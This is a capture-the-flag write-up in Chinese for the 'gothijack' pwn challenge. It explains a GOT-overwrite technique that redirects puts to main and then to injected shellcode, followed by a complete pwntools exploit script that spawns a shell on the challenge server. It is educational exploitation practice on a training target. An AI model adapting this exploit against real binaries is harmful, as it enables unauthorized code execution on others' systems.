## gothijack
先分析本題binary，有開啟canary，無NX、PIE，執行發現會先要求name，寫入到`username`(`0x6010a0`)，該區段為`rwxp`，接著可以任意指定一個address，寫入8byte資料，由於此題有canary，但看起來沒有任何leak，也未提供libc，因此很難使用ROP和return to libc，唯一可以控制rip的方式是在寫入記憶體位址後執行`puts`，因此可以透過改寫`puts@got`來控制。

因此最後做法為使用任意寫先將`puts@got`改為`main`，如此一來就可以重複執行，也就是說可以重複對任意記憶體位址寫入，接著將shellcode分數次寫到`buffer+8`的位址，最後再改寫`puts@got`為`buffer+8`跳過去執行即可

```python
#!/usr/bin/env python3

from pwn import *
context(arch='amd64')

#r = process('gothijack')
r = remote('csie.ctf.tw', 10129)
b = ELF("gothijack")

r.sendline('\x00')
r.recvuntil('write :')
r.sendline(hex(b.got[b'puts']))
r.recvuntil('data :')
r.send(p64(b.symbols[b'main']))

buf = b.symbols[b'username']
sc = asm(shellcraft.sh())
for i in range(0, len(sc), 8):
    r.recvuntil('name :')
    r.sendline('\x00')
    r.recvuntil('write :')
    r.sendline(hex(buf + 8 + i))
    r.recvuntil('data :')
    r.send(sc[i:i + 8])

r.sendline('\x00')
r.recvuntil('write :')
r.sendline(hex(b.got[b'puts']))
r.recvuntil('data :')
r.send(p64(buf + 8))

r.interactive()
```
